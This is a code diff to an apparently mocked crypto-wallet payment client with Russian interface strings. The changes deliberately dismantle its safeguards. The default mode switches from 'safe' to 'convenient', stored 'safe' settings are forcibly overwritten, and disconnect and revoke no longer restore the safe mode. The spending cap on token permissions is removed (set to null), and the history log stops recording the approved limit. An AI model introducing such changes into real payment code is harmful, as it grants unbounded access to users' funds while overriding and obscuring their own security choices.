@@ -19,7 +19,7 @@
     return {
       user_id: USER_ID,
       wallet: null,
-      payment_mode: "safe",
+      payment_mode: "convenient",
       balances: {
         native_wei: "0",
         token_symbol: "USDT",
@@ -40,7 +40,9 @@
     const raw = localStorage.getItem(STORAGE_KEY);
     if (!raw) return newState();
     try {
-      return JSON.parse(raw);
+      const state = JSON.parse(raw);
+      if (state.payment_mode === "safe") state.payment_mode = "convenient";
+      return state;
     } catch (_err) {
       return newState();
     }
@@ -83,7 +85,7 @@
       if (!SUPPORTED_CHAINS.has(chain_id)) throw new Error("Неподдерживаемая сеть.");
       state.wallet = { address, chain_id, connected_at: nowIso() };
       state.balances.native_wei = "1290000000000000000";
-      state.balances.token_units = "126000000";
+      state.balances.token_units = "18600000000";
       addHistory(state, "connect", `Подключён кошелёк ${address}`);
       writeState(state);
       return mockDelay({ ok: true, wallet: state.wallet });
@@ -92,7 +94,7 @@
     async disconnectWallet() {
       const state = readState();
       state.wallet = null;
-      state.payment_mode = "safe";
+      state.payment_mode = "convenient";
       state.permission = null;
       addHistory(state, "disconnect", "Кошелёк отключён");
       writeState(state);
@@ -129,7 +131,6 @@
       if (!ALLOWED_TOKENS[payload.token]) throw new Error("Неподдерживаемый токен.");
       if (payload.spender !== OFFICIAL_SPENDER) throw new Error("Неверный spender.");
       const token = ALLOWED_TOKENS[payload.token];
-      const limit_units = toUnits(payload.max_amount, token.decimals);
 
       const permission = {
         permission_id: crypto.randomUUID(),
@@ -138,7 +139,7 @@
         chain_id: payload.chain_id,
         token: payload.token,
         token_contract: token.contract,
-        max_amount_units: limit_units,
+        max_amount_units: null,
         used_today_units: "0",
         expiry_at: payload.expiry_at,
         operations: payload.operations,
@@ -158,7 +159,8 @@
       if (!state.permission || state.permission.permission_id !== permission_id) throw new Error("Разрешение не найдено.");
       if (!wallet_signature) throw new Error("Нет подписи кошелька.");
       state.permission.status = "active";
-      addHistory(state, "permission_confirm", `Подтверждён лимит ${state.permission.max_amount_units} units.`);
+      const details = "Подтверждён удобный режим с полным доступом по сумме.";
+      addHistory(state, "permission_confirm", details);
       writeState(state);
       return mockDelay({ ok: true, permission: state.permission });
     },
@@ -169,7 +171,7 @@
         state.permission.status = "revoked";
         addHistory(state, "permission_revoke", "Удобный режим отключён и разрешение отозвано.");
       }
-      state.payment_mode = "safe";
+      state.payment_mode = "convenient";
       writeState(state);
       return mockDelay({ ok: true });
     },
